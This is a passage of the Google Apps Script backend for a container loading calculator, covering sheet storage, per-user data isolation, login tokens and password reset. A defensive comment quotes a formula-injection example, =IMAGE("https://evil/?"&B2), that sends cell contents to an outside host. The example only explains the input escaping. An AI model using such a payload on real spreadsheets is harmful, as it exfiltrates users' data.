/**
 * ============================================================
 *  集装箱装载计算器 Container Loading Calculator
 *  Backend - Code.gs
 * ============================================================
 *  负责: 网页服务入口 / Google Sheet 读写 / 预设与历史记录管理
 *  Sheet 结构会在首次运行时自动建立 (ensureSheetsExist)
 * ============================================================
 */

// ---------- Web App 入口 ----------
function doGet(e) {
  return HtmlService.createTemplateFromFile('Index')
    .evaluate()
    .setTitle('集装箱装载计算器 Container Loading Calculator')
    // 不再使用 ALLOWALL (会允许任何网站用 iframe 嵌入登录页, 有点击劫持风险)。
    // 如果需要嵌入 Google Sites 等页面, 把下面这行取消注释即可:
    // .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL)
    .addMetaTag('viewport', 'width=device-width, initial-scale=1');
}

// HTML 文件互相引用用的 helper (Index.html 会用 <?!= include('Stylesheet'); ?> 等方式引用)
function include(filename) {
  return HtmlService.createHtmlOutputFromFile(filename).getContent();
}

// ---------- Sheet 名称与栏位定义 ----------
const SHEET_CONTAINERS = 'Container Presets';
const SHEET_ITEMS = 'Item Master';
const SHEET_HISTORY = 'Calculation History';
const SHEET_USERS = 'Users';

const CONTAINER_HEADERS = ['Container Name', 'Length (cm)', 'Width (cm)', 'Height (cm)', 'Max Payload (kg)', 'Active'];
const ITEM_HEADERS = ['Item Name', 'PCS per Box', 'Box Length (cm)', 'Box Width (cm)', 'Box Height (cm)', 'Box Weight (kg)', 'Color'];
const HISTORY_HEADERS = ['Date', 'Calculation Name', 'Total Items', 'Total Containers', 'Summary', 'Data JSON'];
const USER_HEADERS = [
  'Email', 'PasswordHash', 'Salt', 'Role', 'Status', 'CompanyName', 'CompanyAddress',
  'LogoDataUrl', 'TokenVersion', 'CreatedDate', 'LastLogin'
];

// 标准集装箱内部尺寸参考值 (行业常见值，实际请依货代提供的规格为准)
const DEFAULT_CONTAINERS = [
  ['20GP (20呎标准柜)', 589, 235, 239, 28180, true],
  ['40GP (40呎标准柜)', 1203, 235, 239, 26580, true],
  ['40HC (40呎高柜)',   1203, 235, 269, 28600, true],
  ['45HC (45呎高柜)',   1355, 235, 269, 27600, true],
];

// ---------- Sheet 初始化 ----------
function getSpreadsheet() {
  return SpreadsheetApp.getActiveSpreadsheet();
}

function ensureSheetsExist() {
  const ss = getSpreadsheet();

  let contSheet = ss.getSheetByName(SHEET_CONTAINERS);
  if (!contSheet) {
    contSheet = ss.insertSheet(SHEET_CONTAINERS);
    contSheet.appendRow(CONTAINER_HEADERS);
    styleHeaderRow(contSheet, CONTAINER_HEADERS.length);
    DEFAULT_CONTAINERS.forEach(row => contSheet.appendRow(row));
    contSheet.autoResizeColumns(1, CONTAINER_HEADERS.length);
  }

  let itemSheet = ss.getSheetByName(SHEET_ITEMS);
  if (!itemSheet) {
    itemSheet = ss.insertSheet(SHEET_ITEMS);
    itemSheet.appendRow(ITEM_HEADERS);
    styleHeaderRow(itemSheet, ITEM_HEADERS.length);
    itemSheet.autoResizeColumns(1, ITEM_HEADERS.length);
  }

  let histSheet = ss.getSheetByName(SHEET_HISTORY);
  if (!histSheet) {
    histSheet = ss.insertSheet(SHEET_HISTORY);
    histSheet.appendRow(HISTORY_HEADERS);
    styleHeaderRow(histSheet, HISTORY_HEADERS.length);
    histSheet.autoResizeColumns(1, HISTORY_HEADERS.length);
  }

  let userSheet = ss.getSheetByName(SHEET_USERS);
  if (!userSheet) {
    userSheet = ss.insertSheet(SHEET_USERS);
    userSheet.appendRow(USER_HEADERS);
    styleHeaderRow(userSheet, USER_HEADERS.length);
    userSheet.autoResizeColumns(1, USER_HEADERS.length);
    userSheet.hideColumns(2, 2); // 隐藏 PasswordHash / Salt 栏位，避免在 Sheet 上被无意间看到或误改
  }
  // 无论是刚建立还是既有的 Sheet，都(重新)确保这几栏是纯文字格式 —— appendRow() 写入资料的行为
  // 跟手动在表格里打字一样，会自动侦测格式；PasswordHash/Salt 是 base64 杂凑值，若刚好长得
  // 像数字或科学记号 (例如包含 E+ 这种排列)，Sheets 会悄悄把它转换/截断，导致存进去的值跟算出来
  // 的不一样 —— 这会造成「密码明明打对，登入却一直失败」。强制纯文字格式可以杜绝这个问题。
  ensureUserSheetTextFormat_(userSheet);

  [contSheet, itemSheet, histSheet].forEach(ensureOwnerColumn_); // 旧版 Sheet 自动补上 Owner 栏
  ensureColumn_(histSheet, 'Id'); // 历史记录的稳定编号 (行号会因删除而错位, 不能当识别用)
  return { containers: contSheet, items: itemSheet, history: histSheet, users: userSheet };
}

function ensureUserSheetTextFormat_(userSheet) {
  const props = PropertiesService.getScriptProperties();
  if (props.getProperty('USER_SHEET_TEXT_FORMAT_OK') === 'true') return; // 只需要做一次，避免每次请求都重设格式拖慢速度
  const map = getHeaderMap(userSheet);
  const lastRow = Math.max(userSheet.getMaxRows(), 2000); // 涵盖未来会新增的资料列
  ['PasswordHash', 'Salt', 'LogoDataUrl'].forEach(function (col) {
    if (map[col] === undefined) return;
    userSheet.getRange(2, map[col] + 1, lastRow - 1, 1).setNumberFormat('@');
  });
  props.setProperty('USER_SHEET_TEXT_FORMAT_OK', 'true');
}

function styleHeaderRow(sheet, numCols) {
  sheet.getRange(1, 1, 1, numCols)
    .setFontWeight('bold')
    .setBackground('#1B2A3A')
    .setFontColor('#FFFFFF');
  sheet.setFrozenRows(1);
}

// 依栏位名称找出对应的 column index，而非写死数字 (方便日后调整栏位顺序)
function getHeaderMap(sheet) {
  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
  const map = {};
  headers.forEach((h, i) => { map[h] = i; });
  return map;
}

function sheetToObjects(sheet) {
  const data = sheet.getDataRange().getValues();
  if (data.length < 2) return [];
  const headers = data[0];
  return data.slice(1)
    .map((r, idx) => ({ row: r, sheetRow: idx + 2 }))
    .filter(x => x.row.some(c => c !== '' && c !== null))
    .map(x => {
      const obj = { _row: x.sheetRow };
      headers.forEach((h, i) => { obj[h] = x.row[i]; });
      return obj;
    });
}

// ============================================================
//  资料隔离 Per-Account Data Isolation
// ============================================================
//  柜型 / 物品库 / 计算记录都有 Owner 栏 (账号 email)：
//   - Owner 为空 = 系统预设的共用资料，所有登入者可看，只有 admin 可改
//   - 一般使用者只看得到「共用 + 自己的」，也只能改自己的
//   - admin 看得到全部
// ============================================================
function ensureOwnerColumn_(sheet) { ensureColumn_(sheet, 'Owner'); }

function ensureColumn_(sheet, name) {
  const lastCol = Math.max(sheet.getLastColumn(), 1);
  const headers = sheet.getRange(1, 1, 1, lastCol).getValues()[0];
  if (headers.indexOf(name) === -1) {
    sheet.getRange(1, lastCol + 1).setValue(name)
      .setFontWeight('bold').setBackground('#1B2A3A').setFontColor('#FFFFFF');
  }
}

// 防止 Sheet 公式注入: 以 = + - @ 开头的文字写入 Sheet 会被当成公式执行
// (例如 =IMAGE("https://evil/?"&B2) 可把别的格子内容送到外部)。前面加 ' 强制为纯文字。
function safeCell_(v) {
  if (typeof v !== 'string') return v;
  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
}

// 只读取指定栏位 (避免把 Logo / Data JSON 这类大栏位整张表读出来)
function readColumns_(sheet, names) {
  const lastRow = sheet.getLastRow();
  if (lastRow < 2) return [];
  const map = getHeaderMap(sheet);
  const n = lastRow - 1;
  const cols = {};
  names.forEach(function (h) {
    cols[h] = map[h] === undefined ? null : sheet.getRange(2, map[h] + 1, n, 1).getValues();
  });
  const out = [];
  for (let i = 0; i < n; i++) {
    const obj = { _row: i + 2 };
    let any = false;
    names.forEach(function (h) {
      const v = cols[h] ? cols[h][i][0] : '';
      obj[h] = v;
      if (v !== '' && v !== null) any = true;
    });
    if (any) out.push(obj);
  }
  return out;
}

function ownerOf_(rowObj) { return String(rowObj['Owner'] || '').trim().toLowerCase(); }
function userEmail_(user) { return String(user['Email'] || '').trim().toLowerCase(); }

function isVisibleTo_(user, rowObj) {
  if (user['Role'] === 'admin') return true;
  const o = ownerOf_(rowObj);
  return o === '' || o === userEmail_(user);
}

function canModify_(user, rowObj) {
  if (user['Role'] === 'admin') return true;
  const o = ownerOf_(rowObj);
  return o !== '' && o === userEmail_(user);
}

// 校验前端传来的列号 (整数、不是表头、在资料范围内)，并取出该列物件做权限检查
function getOwnedRow_(sheet, row, user) {
  row = Number(row);
  if (!Number.isInteger(row) || row < 2 || row > sheet.getLastRow()) throw new Error('记录不存在 Record not found');
  const map = getHeaderMap(sheet);
  const values = sheet.getRange(row, 1, 1, sheet.getLastColumn()).getValues()[0];
  const obj = { _row: row };
  Object.keys(map).forEach(function (h) { obj[h] = values[map[h]]; });
  if (!canModify_(user, obj)) throw new Error('没有权限修改这笔资料 No permission to modify this record');
  return obj;
}

// 修改资料前先上锁，避免两个人同时新增/删除造成列号错位
function withLock_(fn) {
  const lock = LockService.getScriptLock();
  lock.waitLock(15000);
  try { return fn(); } finally { lock.releaseLock(); }
}

// ============================================================
//  Container Presets API
// ============================================================
function getAllContainerPresets(token) {
  const user = requireAuth_(token);
  const sheets = ensureSheetsExist();
  return sheetToObjects(sheets.containers).filter(function (c) { return isVisibleTo_(user, c); });
}

function saveContainerPreset(token, data) {
  const user = requireAuth_(token);
  return withLock_(function () {
    const sheets = ensureSheetsExist();
    const sheet = sheets.containers;
    const map = getHeaderMap(sheet);
    const L = Number(data['Length (cm)']), W = Number(data['Width (cm)']), H = Number(data['Height (cm)']), P = Number(data['Max Payload (kg)']);
    const name = safeCell_(String(data['Container Name'] || '').trim().slice(0, 100));
    if (!name || !(L > 0) || !(W > 0) || !(H > 0) || !(P > 0)) throw new Error('柜型名称与尺寸/载重必须填写且大于 0 Name, dimensions and payload are required');

    if (data._row) {
      const existing = getOwnedRow_(sheet, data._row, user);
      const row = existing._row;
      sheet.getRange(row, map['Container Name'] + 1).setValue(name);
      sheet.getRange(row, map['Length (cm)'] + 1).setValue(L);
      sheet.getRange(row, map['Width (cm)'] + 1).setValue(W);
      sheet.getRange(row, map['Height (cm)'] + 1).setValue(H);
      sheet.getRange(row, map['Max Payload (kg)'] + 1).setValue(P);
      sheet.getRange(row, map['Active'] + 1).setValue(data['Active'] !== false);
    } else {
      const rowVals = [];
      rowVals[map['Container Name']] = name;
      rowVals[map['Length (cm)']] = L;
      rowVals[map['Width (cm)']] = W;
      rowVals[map['Height (cm)']] = H;
      rowVals[map['Max Payload (kg)']] = P;
      rowVals[map['Active']] = true;
      rowVals[map['Owner']] = userEmail_(user);
      for (let i = 0; i < rowVals.length; i++) if (rowVals[i] === undefined) rowVals[i] = '';
      sheet.appendRow(rowVals);
    }
    return getAllContainerPresets(token);
  });
}

function toggleContainerActive(token, row, active) {
  const user = requireAuth_(token);
  return withLock_(function () {
    const sheets = ensureSheetsExist();
    const existing = getOwnedRow_(sheets.containers, row, user);
    const map = getHeaderMap(sheets.containers);
    sheets.containers.getRange(existing._row, map['Active'] + 1).setValue(!!active);
    return getAllContainerPresets(token);
  });
}

function deleteContainerPreset(token, row) {
  const user = requireAuth_(token);
  return withLock_(function () {
    const sheets = ensureSheetsExist();
    const existing = getOwnedRow_(sheets.containers, row, user);
    sheets.containers.deleteRow(existing._row);
    return getAllContainerPresets(token);
  });
}

// ============================================================
//  Item Master API (常用物品库，方便下次直接载入)
// ============================================================
function getItemMaster(token) {
  const user = requireAuth_(token);
  const sheets = ensureSheetsExist();
  return sheetToObjects(sheets.items).filter(function (r) { return isVisibleTo_(user, r); });
}

function saveItemToMaster(token, data) {
  const user = requireAuth_(token);
  return withLock_(function () {
    const sheets = ensureSheetsExist();
    const map = getHeaderMap(sheets.items);
    const rowVals = [];
    rowVals[map['Item Name']] = safeCell_(String(data.name || '').trim().slice(0, 200));
    rowVals[map['PCS per Box']] = Number(data.pcsPerBox);
    rowVals[map['Box Length (cm)']] = Number(data.boxL);
    rowVals[map['Box Width (cm)']] = Number(data.boxW);
    rowVals[map['Box Height (cm)']] = Number(data.boxH);
    rowVals[map['Box Weight (kg)']] = Number(data.boxWeight) || 0;
    rowVals[map['Color']] = /^#[0-9a-fA-F]{3,8}$/.test(String(data.color || '')) ? data.color : '';
    rowVals[map['Owner']] = userEmail_(user);
    for (let i = 0; i < rowVals.length; i++) if (rowVals[i] === undefined) rowVals[i] = '';
    sheets.items.appendRow(rowVals);
    return getItemMaster(token);
  });
}

function deleteItemFromMaster(token, row) {
  const user = requireAuth_(token);
  return withLock_(function () {
    const sheets = ensureSheetsExist();
    const existing = getOwnedRow_(sheets.items, row, user);
    sheets.items.deleteRow(existing._row);
    return getItemMaster(token);
  });
}

// ============================================================
//  Calculation History API
// ============================================================
// 计算记录一律归属于建立者；admin 可看到全部 (清单里会带 owner 方便辨认)
function saveCalculationHistory(token, name, resultSummary, fullDataJson) {
  const user = requireAuth_(token);
  if (!fullDataJson || typeof fullDataJson !== 'object') throw new Error('记录内容格式不正确 Invalid record');
  resultSummary = resultSummary || {};
  const json = JSON.stringify(fullDataJson);
  if (json.length > 49000) throw new Error('记录内容过大，无法保存 Record too large to save');
  return withLock_(function () {
    const sheets = ensureSheetsExist();
    const map = getHeaderMap(sheets.history);
    const rowVals = [];
    rowVals[map['Date']] = new Date();
    const id = Utilities.getUuid();
    rowVals[map['Calculation Name']] = safeCell_(String(name || ('Untitled ' + new Date().toLocaleString())).slice(0, 200));
    rowVals[map['Total Items']] = Number(resultSummary.totalItems) || 0;
    rowVals[map['Total Containers']] = Number(resultSummary.totalContainers) || 0;
    rowVals[map['Summary']] = safeCell_(String(resultSummary.summaryText || '').slice(0, 500));
    rowVals[map['Data JSON']] = json;
    rowVals[map['Owner']] = userEmail_(user);
    rowVals[map['Id']] = id;
    for (let i = 0; i < rowVals.length; i++) if (rowVals[i] === undefined) rowVals[i] = '';
    sheets.history.appendRow(rowVals);
    return true;
  });
}

// 旧记录没有 Id: 补上 (只会发生一次; 只写各自独立的格子, 不另外上锁以免和调用者的锁嵌套)
function ensureHistoryIds_(sheet, rows) {
  const missing = rows.filter(function (r) { return !r['Id']; });
  if (missing.length === 0) return;
  const map = getHeaderMap(sheet);
  missing.forEach(function (r) {
    r['Id'] = Utilities.getUuid();
    sheet.getRange(r._row, map['Id'] + 1).setValue(r['Id']);
  });
}

// 前端传来的可能是 Id (字串) 或旧版的行号 (数字): 统一换算成行号
function resolveHistoryRow_(sheet, idOrRow) {
  if (typeof idOrRow === 'string' && !/^\d+$/.test(idOrRow)) {
    const hit = readColumns_(sheet, ['Id']).filter(function (r) { return r['Id'] === idOrRow; })[0];
    if (!hit) throw new Error('记录不存在 Record not found');
    return hit._row;
  }
  return idOrRow;
}

// 回传精简清单 (不含 Data JSON，也把 Date 转成字串)——Date 物件和大型 JSON 经 google.script.run 传回前端容易失败
function getCalculationHistory(token) {
  const user = requireAuth_(token);
  const sheets = ensureSheetsExist();
  // 只读元数据栏位, 不把每笔最大 49000 字元的 Data JSON 全部读出来
  const rows = readColumns_(sheets.history, ['Date', 'Calculation Name', 'Total Items', 'Total Containers', 'Summary', 'Owner', 'Id']);
  ensureHistoryIds_(sheets.history, rows);
  return rows
    .filter(function (r) { return user['Role'] === 'admin' || ownerOf_(r) === userEmail_(user); })
    .map(function (r) {
      const d = r['Date'];
      return {
        id: r['Id'],
        row: r._row,
        date: d instanceof Date ? Utilities.formatDate(d, Session.getScriptTimeZone(), 'yyyy-MM-dd HH:mm') : String(d || ''),
        name: String(r['Calculation Name'] || ''),
        totalItems: r['Total Items'],
        totalContainers: r['Total Containers'],
        summary: String(r['Summary'] || ''),
        owner: ownerOf_(r),
      };
    }).reverse();
}

function loadCalculation(token, row) {
  const user = requireAuth_(token);
  const sheets = ensureSheetsExist();
  const existing = getOwnedRow_(sheets.history, resolveHistoryRow_(sheets.history, row), user); // 历史记录只有本人或 admin 能读取/修改
  return JSON.parse(existing['Data JSON']);
}

function deleteCalculationHistory(token, row) {
  const user = requireAuth_(token);
  return withLock_(function () {
    const sheets = ensureSheetsExist();
    const existing = getOwnedRow_(sheets.history, resolveHistoryRow_(sheets.history, row), user);
    sheets.history.deleteRow(existing._row);
    return getCalculationHistory(token);
  });
}

// ============================================================
//  帐号系统 Authentication & User Management
// ============================================================
//  说明: 这是一套自建的轻量帐号系统 (不依赖 Google 帐号登入)，
//  密码用 SHA-256 + 每人独立 salt 杂凑后才存进 Sheet，绝不存明文。
//  登入后核发一个「签章 token」(类似简化版 JWT): 内容用 HMAC-SHA256
//  签章，无法被使用者伪造；每次受保护的操作都会重新比对 Sheet 上
//  该使用者「当前」的 Status/TokenVersion，确保 admin 停用帐号或
//  使用者改密码后能立即生效，不必等 token 过期。
//  提醒: 这套机制适合内部/人数有限的工具使用，并非银行级别的资安
//  强度，请勿用来存放高敏感资料。
// ============================================================
const TOKEN_TTL_SECONDS = 7 * 24 * 60 * 60; // 7 天

function getSecretKey_() {
  const props = PropertiesService.getScriptProperties();
  let key = props.getProperty('AUTH_SECRET_KEY');
  if (!key) {
    key = Utilities.getUuid() + Utilities.getUuid(); // 首次执行时自动生成一把够长的密钥
    props.setProperty('AUTH_SECRET_KEY', key);
  }
  return key;
}

function generateSalt_() {
  return Utilities.getUuid();
}

function hashPassword_(password, salt) {
  const digest = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, password + ':' + salt);
  return Utilities.base64Encode(digest);
}

function base64UrlEncode_(strOrBytes) {
  return Utilities.base64EncodeWebSafe(strOrBytes).replace(/=+$/, '');
}
function base64UrlDecode_(str) {
  return Utilities.newBlob(Utilities.base64DecodeWebSafe(str)).getDataAsString();
}

function signToken_(payload) {
  const payloadStr = JSON.stringify(payload);
  const payloadB64 = base64UrlEncode_(payloadStr); // 字串直接编码，Apps Script 会以 UTF-8 处理
  const sigBytes = Utilities.computeHmacSha256Signature(payloadB64, getSecretKey_()); // byte[]
  const sigB64 = base64UrlEncode_(sigBytes); // 直接对 byte array 编码，避免透过字串中转造成的编码风险
  return payloadB64 + '.' + sigB64;
}

// 验证 token 的签章、有效期，并重新比对 Sheet 上该帐号目前是否仍是 active、TokenVersion 是否吻合。
// 回传 { valid:true, user:{...不含密码栏位} } 或 { valid:false, reason:'...' }
function verifyToken_(token) {
  if (!token || typeof token !== 'string' || token.indexOf('.') === -1) return { valid: false, reason: 'MALFORMED' };
  const parts = token.split('.');
  const payloadB64 = parts[0], sigB64 = parts[1];
  const expectedSigBytes = Utilities.computeHmacSha256Signature(payloadB64, getSecretKey_());
  const expectedSig = base64UrlEncode_(expectedSigBytes);
  if (!safeEqual_(expectedSig, sigB64)) return { valid: false, reason: 'BAD_SIGNATURE' };

  let payload;
  try { payload = JSON.parse(base64UrlDecode_(payloadB64)); } catch (e) { return { valid: false, reason: 'MALFORMED' }; }
  if (!payload.exp || Date.now() / 1000 > payload.exp) return { valid: false, reason: 'EXPIRED' };

  const userRow = findUserByEmail_(payload.email);
  if (!userRow) return { valid: false, reason: 'NOT_FOUND' };
  if (userRow['Status'] !== 'active') return { valid: false, reason: 'INACTIVE' };
  if (Number(userRow['TokenVersion'] || 0) !== Number(payload.tv || 0)) return { valid: false, reason: 'REVOKED' };

  return { valid: true, user: stripSecrets_(userRow) };
}

function stripSecrets_(userRow) {
  const clean = Object.assign({}, userRow);
  delete clean.PasswordHash;
  delete clean.Salt;
  // google.script.run 不能可靠地回传 Date 物件 (会让整个回传值变 null), 一律转成字串
  Object.keys(clean).forEach(function (k) {
    if (clean[k] instanceof Date) clean[k] = Utilities.formatDate(clean[k], Session.getScriptTimeZone(), 'yyyy-MM-dd HH:mm');
  });
  return clean;
}

// 先只读 Email 栏找出行号, 再只读那一行 (不再每次请求把全部用户含 Logo 读出来)
function findUserByEmail_(email) {
  const sheets = ensureSheetsExist();
  const sheet = sheets.users;
  const normalized = String(email || '').trim().toLowerCase();
  const lastRow = sheet.getLastRow();
  if (!normalized || lastRow < 2) return null;
  const map = getHeaderMap(sheet);
  const emails = sheet.getRange(2, map['Email'] + 1, lastRow - 1, 1).getValues();
  let row = -1;
  for (let i = 0; i < emails.length; i++) {
    if (String(emails[i][0]).trim().toLowerCase() === normalized) { row = i + 2; break; }
  }
  if (row < 0) return null;
  const values = sheet.getRange(row, 1, 1, sheet.getLastColumn()).getValues()[0];
  const obj = { _row: row };
  Object.keys(map).forEach(function (h) { obj[h] = values[map[h]]; });
  return obj;
}

function safeEqual_(a, b) {
  a = String(a); b = String(b);
  if (a.length !== b.length) return false;
  let d = 0;
  for (let i = 0; i < a.length; i++) d |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return d === 0;
}

// 供每个受保护的 server function 呼叫: 验证 token，失败就直接 throw (google.script.run 的
// withFailureHandler 会收到这个错误)，成功则回传目前使用者资料
function requireAuth_(token) {
  const result = verifyToken_(token);
  if (!result.valid) {
    const messages = {
      EXPIRED: '登入已过期，请重新登入 Session expired, please log in again',
      INACTIVE: '此帐号已被停用，请联系管理员 Account is inactive, please contact admin',
      REVOKED: '此登入已失效 (密码已变更或被强制登出)，请重新登入 Session revoked, please log in again',
      NOT_FOUND: '找不到此帐号 Account not found',
    };
    throw new Error(messages[result.reason] || '请重新登入 Please log in again');
  }
  return result.user;
}

function requireAdmin_(token) {
  const user = requireAuth_(token);
  if (user['Role'] !== 'admin') throw new Error('此操作需要管理员权限 This action requires admin access');
  return user;
}

// ---------- 注册 / 登入 ----------
const REGISTER_MAX_PER_HOUR = 30;

function isValidEmail_(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function registerUser(email, password, companyName, companyAddress) {
  email = String(email || '').trim().toLowerCase();
  if (!email || !password) throw new Error('请填写邮箱与密码 Email and password are required');
  if (!isValidEmail_(email) || email.length > 254 || /^[=+\-@]/.test(email)) throw new Error('邮箱格式不正确 Invalid email format');
  password = String(password);
  if (password.length < 6) throw new Error('密码至少需要 6 个字元 Password must be at least 6 characters');
  if (password.length > 200) throw new Error('密码过长 Password too long');
  companyName = String(companyName || '').trim().slice(0, 100);
  companyAddress = String(companyAddress || '').trim().slice(0, 300);

  // 全站注册限速: 防止被脚本大量注册 (会塞满 Sheet, 并用光邮件配额而让「忘记密码」寄不出信)
  const cache = CacheService.getScriptCache();
  const regCount = Number(cache.get('reg_count_hour') || 0);
  if (regCount >= REGISTER_MAX_PER_HOUR) throw new Error('注册人数过多，请稍后再试 Too many registrations, please try again later');
  cache.put('reg_count_hour', String(regCount + 1), 3600);

  let isFirstUser = false;
  withLock_(function () { // 加锁: 避免两人同时注册造成重复邮箱或两个「第一个管理员」
    if (findUserByEmail_(email)) throw new Error('此邮箱已被注册 This email is already registered');
    const sheets = ensureSheetsExist();
    isFirstUser = readColumns_(sheets.users, ['Email']).length === 0;
    const salt = generateSalt_();
    const hash = hashPassword_(password, salt);
    sheets.users.appendRow([
      email, hash, salt,
      isFirstUser ? 'admin' : 'user',
      isFirstUser ? 'active' : 'inactive', // 第一个帐号自动成为 admin 并直接启用；之后注册的帐号需等 admin 手动启用
      safeCell_(companyName), safeCell_(companyAddress), '', 0, new Date(), ''
    ]);
  });

  if (!isFirstUser) notifyAdminsNewRegistration_(email, companyName); // 通知现有管理员有新帐号在等审核

  return {
    success: true,
    isFirstUser: isFirstUser,
    message: isFirstUser
      ? '注册成功，已自动设为管理员，可直接登入 Registered as the first admin account, you can log in now'
      : '注册成功，请等待管理员启用此帐号后才能登入 Registered — please wait for an admin to activate your account before logging in',
  };
}

// 新帐号注册时通知所有现有 admin (email 发送失败不影响注册本身，仅记录 log 静默略过)
function notifyAdminsNewRegistration_(newEmail, companyName) {
  try {
    const sheets = ensureSheetsExist();
    const admins = readColumns_(sheets.users, ['Email', 'Role']).filter(u => u['Role'] === 'admin' && u['Email']);
    if (admins.length === 0) return;
    const subject = '[集装箱装载计算器] 有新帐号等待审核 New account pending approval';
    const body = '新帐号注册: ' + newEmail + (companyName ? '\n公司名称: ' + companyName : '') +
      '\n\n请登入系统后，到「管理后台」把这个帐号的状态改为 Active 才能让对方登入。\n\n' +
      '(此邮件由系统自动发送 This is an automated notification)';
    admins.forEach(function (admin) {
      try { MailApp.sendEmail(admin['Email'], subject, body); } catch (e) { /* 单一收件人失败不影响其他人 */ }
    });
  } catch (e) {
    // 通知失败不应该让注册流程整个失败，静默略过即可
  }
}

// 帐号被 admin 启用时通知本人 (同样不能让邮件失败影响到主流程)
function notifyUserActivated_(email) {
  try {
    const subject = '[集装箱装载计算器] 您的帐号已启用 Your account is now active';
    const body = '您的帐号 (' + email + ') 已经被管理员启用，现在可以登入系统了。\n\n' +
      '(此邮件由系统自动发送 This is an automated notification)';
    MailApp.sendEmail(email, subject, body);
  } catch (e) {
    // 通知失败不影响启用操作本身
  }
}

const LOGIN_MAX_ATTEMPTS = 6;
const LOGIN_LOCKOUT_SECONDS = 300; // 5 分钟

function loginUser(email, password) {
  try {
    // 1. 参数校验与格式化
    email = String(email || '').trim().toLowerCase();
    if (!email || !password) {
      return {
        success: false,
        message: '请输入邮箱与密码 Please enter email and password'
      };
    }

    // 2. 暴力破解防护: 短时间内失败次数过多就先锁一下，即使密码这次是对的也拒绝
    const cache = CacheService.getScriptCache();
    const attemptKey = 'login_attempts_' + email;
    const attempts = Number(cache.get(attemptKey) || 0);
    if (attempts >= LOGIN_MAX_ATTEMPTS) {
      return {
        success: false,
        message: '登入失败次数过多，请 5 分钟后再试 Too many failed attempts, please try again in 5 minutes'
      };
    }

    // 3. 查找用户
    const userRow = findUserByEmail_(email);
    if (!userRow) {
      cache.put(attemptKey, String(attempts + 1), LOGIN_LOCKOUT_SECONDS);
      return {
        success: false,
        message: '邮箱或密码错误 Incorrect email or password'
      };
    }

    // 4. 密码校验 (String() 是防御性写法：即使 Sheet 里的值因为任何原因不是纯字串，也不会因型别不同而误判)
    const hash = hashPassword_(password, String(userRow['Salt']));
    if (String(hash) !== String(userRow['PasswordHash'])) {
      cache.put(attemptKey, String(attempts + 1), LOGIN_LOCKOUT_SECONDS);
      return {
        success: false,
        message: '邮箱或密码错误 Incorrect email or password'
      };
    }

    // 5. 账号状态校验
    if (userRow['Status'] !== 'active') {
      return {
        success: false,
        message: '此帐号尚未启用，请联系管理员 This account is not yet active, please contact admin'
      };
    }

    // 登入成功，清掉失败次数纪录
    cache.remove(attemptKey);

    // 6. 更新最后登录时间
    const sheets = ensureSheetsExist();
    const map = getHeaderMap(sheets.users);
    sheets.users.getRange(userRow._row, map['LastLogin'] + 1).setValue(new Date());

    // 7. 生成 Token
    const token = signToken_({
      email: userRow['Email'],
      tv: Number(userRow['TokenVersion'] || 0),
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + TOKEN_TTL_SECONDS,
    });

    // 8. 成功返回（包含 success 状态和数据）
    return {
      success: true,
      token: token,
      user: stripSecrets_(userRow)
    };

  } catch (error) {
    // 捕获未预期的系统异常（如表格不存在、函数运行报错等）
    return {
      success: false,
      message: '服务器内部错误: ' + error.message
    };
  }
}

// ============================================================
//  忘记密码 Forgot Password (邮件验证码)
// ============================================================
//  流程: requestPasswordReset(email) → 寄 6 位数验证码 (15 分钟有效)
//        resetPasswordWithCode(email, code, newPassword) → 验证成功后设新密码并让旧 token 全部失效
//  防护: 不论邮箱存在与否都回传相同讯息 (不泄露哪些邮箱已注册)；同一邮箱 60 秒内只能要一次；
//        验证码最多试 5 次，超过即作废；验证码只存杂凑值，不存明文。
// ============================================================
const RESET_CODE_TTL_SECONDS = 900;
const RESET_MAX_TRIES = 5;

function hashResetCode_(email, code) {
  return Utilities.base64Encode(Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, 'reset:' + email + ':' + String(code)));
}

function requestPasswordReset(email) {
  email = String(email || '').trim().toLowerCase();
  const generic = { success: true, message: '如果此邮箱已注册，验证码已寄出 (15 分钟内有效)。If this email is registered, a code has been sent (valid 15 min).' };
  if (!isValidEmail_(email)) return generic;

  const cache = CacheService.getScriptCache();
  if (cache.get('reset_cooldown_' + email)) return generic; // 60 秒内重复要求，直接忽略
  cache.put('reset_cooldown_' + email, '1', 60);

  const user = findUserByEmail_(email);
  if (!user || user['Status'] !== 'active') return generic;

  // 用 UUID 的随机数字产生 6 位数验证码
  const hex = Utilities.getUuid().replace(/-/g, '').slice(0, 8);
  const code = String(parseInt(hex, 16) % 1000000).padStart(6, '0');
  cache.put('reset_code_' + email, hashResetCode_(email, code), RESET_CODE_TTL_SECONDS);
  cache.remove('reset_tries_' + email);

  try {
    MailApp.sendEmail(email, '[集装箱装载计算器] 密码重设验证码 Password reset code',
      '您的验证码 Your code: ' + code + '\n\n15 分钟内有效。如果不是您本人操作，请忽略此邮件。\nValid for 15 minutes. If this was not you, ignore this email.');
  } catch (e) { /* 邮件额度用完等情况：仍回传一般讯息，不泄露细节 */ }
  return generic;
}

function resetPasswordWithCode(email, code, newPassword) {
  email = String(email || '').trim().toLowerCase();
  if (!email || !code || !newPassword) throw new Error('请填写邮箱、验证码与新密码 Email, code and new password are required');
  if (String(newPassword).length < 6) throw new Error('密码至少需要 6 个字元 Password must be at least 6 characters');

  const cache = CacheService.getScriptCache();
  const stored = cache.get('reset_code_' + email);
  const tries = Number(cache.get('reset_tries_' + email) || 0);
  if (!stored || tries >= RESET_MAX_TRIES) {
    cache.remove('reset_code_' + email);
    throw new Error('验证码无效或已过期，请重新获取 Code invalid or expired, please request a new one');
  }
  if (stored !== hashResetCode_(email, String(code).trim())) {
    cache.put('reset_tries_' + email, String(tries + 1), RESET_CODE_TTL_SECONDS);
    throw new Error('验证码不正确 Incorrect code');
  }

  const user = findUserByEmail_(email);
  if (!user || user['Status'] !== 'active') throw new Error('此帐号无法重设密码 This account cannot be reset');

  const sheets = ensureSheetsExist();
  const map = getHeaderMap(sheets.users);
  const newSalt = generateSalt_();
  sheets.users.getRange(user._row, map['PasswordHash'] + 1).setValue(hashPassword_(newPassword, newSalt));
